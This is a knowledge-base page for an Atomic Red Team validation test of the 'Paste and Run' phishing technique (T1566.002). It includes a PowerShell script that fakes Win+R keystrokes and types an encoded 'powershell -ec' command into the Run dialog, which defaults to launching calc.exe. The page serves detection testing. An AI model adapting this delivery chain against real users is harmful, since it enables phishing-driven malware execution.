---
atomic_guid: "bc177ef9-6a12-4ebc-a2ec-d41e19c2791d"
title: "Paste and run technique"
framework: "atomic"
generated: "true"
attack_technique_id: "T1566.002"
attack_technique_name: "Phishing: Spearphishing Link"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.002/T1566.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "bc177ef9-6a12-4ebc-a2ec-d41e19c2791d"
  - "Paste and run technique"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Paste and run technique

Tests the **Paste and Run** technique, where users are tricked into running
malicious PowerShell commands by automating the Win+R command to open the
Run dialog and input `encoded PowerShell to execute calc.exe.`

- [Fake CAPTCHA Campaign](https://medium.com/@ahmed.moh.farou2/fake-captcha-campaign-on-arabic-pirated-movie-sites-delivers-lumma-stealer-4f203f7adabf)
- [From Clipboard to Compromise](https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn)

## Metadata

- Atomic GUID: bc177ef9-6a12-4ebc-a2ec-d41e19c2791d
- Technique: T1566.002: Phishing: Spearphishing Link
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1566.002/T1566.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1566-phishing|T1566.002]]

## Input Arguments

### execution_command

- description: The command to execute in the run
- type: String
- default: calc.exe

## Executor

- name: powershell

### Command

```powershell
# Add user32.dll for keybd_event
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class K {
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    }
"@

# Virtual key codes
$VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002

# Open Run dialog (Win+R)
[K]::keybd_event($VK_LWIN, 0, $KEYDOWN, [UIntPtr]::Zero)
[K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero)
[K]::keybd_event($VK_R, 0, $KEYUP, [UIntPtr]::Zero)
[K]::keybd_event($VK_LWIN, 0, $KEYUP, [UIntPtr]::Zero)

# Short delay for Run dialog
Start-Sleep -Milliseconds 500
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait("cmd /c powershell -ec " + [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('#{execution_command}')) + "{ENTER}")
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.002/T1566.002.yaml)
